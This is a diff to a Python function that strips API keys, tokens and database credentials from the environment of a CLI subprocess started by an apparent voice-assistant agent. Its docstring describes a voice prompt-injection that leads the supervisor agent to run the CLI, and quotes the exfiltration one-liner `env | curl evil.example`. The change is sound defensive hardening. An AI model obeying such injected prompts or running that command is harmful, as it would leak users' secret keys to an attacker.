@@ -1121,9 +1121,40 @@ def _clean_env_for_cli(cli_model_id: str) -> dict[str, str]:
     tray pick. The CLI reads JARVIS_PROVIDER for proxy routing and
     JARVIS_MODEL_REGISTRY_ENABLED=1 makes the CLI's per-request
     /model overrides honour our chosen model.
+
+    **Per enterprise plan §P0-SEC-8 (added 2026-05-17):** also strip
+    every `*_API_KEY` / `*_SECRET` / `*_TOKEN` from the inherited env
+    EXCEPT the proxy stub keys the CLI legitimately needs to route
+    through localhost:4000. Background: a voice prompt-injection that
+    talked the supervisor into running `run_jarvis_cli` could otherwise
+    have its CLI subprocess exfiltrate Groq / Anthropic / OpenAI /
+    DeepSeek / Kimi / LiveKit / Google / GitHub / Vercel API keys via
+    one bash one-liner (`env | curl evil.example`). Now the CLI gets
+    the same ANTHROPIC_BASE_URL=localhost:4000 + ANTHROPIC_API_KEY=
+    'jarvis-proxy' stub it needs to talk to the proxy, but no real
+    upstream keys. The proxy at :4000 holds the real keys and signs
+    the outbound requests.
     """
     cli_def = CLI_MODELS[cli_model_id]
+
+    # Suffixes that mark "secret-y" env vars to strip. Conservative
+    # allowlist of stripping rules — keeps env vars the CLI legitimately
+    # needs (PATH, HOME, USER, LANG, TZ, XDG_*, DISPLAY, JARVIS_*,
+    # NODE_*, npm_*, etc.) untouched.
+    _SECRET_SUFFIXES = ("_API_KEY", "_SECRET", "_TOKEN", "_PASSWORD")
+    _SECRET_NAMES = {
+        # Explicit names that don't match the suffix pattern but are
+        # still real upstream credentials.
+        "OPENAI_API_KEY", "ANTHROPIC_API_KEY",  # match _API_KEY but
+                                                 # documenting intent
+        "GH_TOKEN", "GITHUB_TOKEN",              # GitHub CLI auth
+        "DATABASE_URL", "POSTGRES_PASSWORD",     # database creds
+        "REDIS_URL",                              # Redis if password-protected
+        "VERCEL_TOKEN", "VERCEL_OIDC_TOKEN",     # deploy creds
+    }
+
     env: dict[str, str] = {}
+    stripped: list[str] = []
     for k, v in os.environ.items():
         if v is None:
             continue
@@ -1131,7 +1162,19 @@ def _clean_env_for_cli(cli_model_id: str) -> dict[str, str]:
             continue
         if k == "CLAUDECODE":
             continue
+        # Strip secrets unless we explicitly need to keep them. The
+        # `setdefault` calls below restore ANTHROPIC_BASE_URL +
+        # ANTHROPIC_API_KEY with the proxy-stub values, so stripping
+        # them here is safe — they'll come back as 'jarvis-proxy'.
+        if any(k.endswith(suffix) for suffix in _SECRET_SUFFIXES) or k in _SECRET_NAMES:
+            stripped.append(k)
+            continue
         env[k] = v
+    if stripped:
+        logger.info(
+            f"[run_jarvis_cli] stripped {len(stripped)} secret env var(s) from CLI subprocess: "
+            f"{', '.join(sorted(stripped))}"
+        )
     env.setdefault("ANTHROPIC_BASE_URL", "http://localhost:4000")
     env.setdefault("ANTHROPIC_API_KEY",  "jarvis-proxy")
     # Bash, not zsh — zsh's NOMATCH would fail on URL-with-`?` args
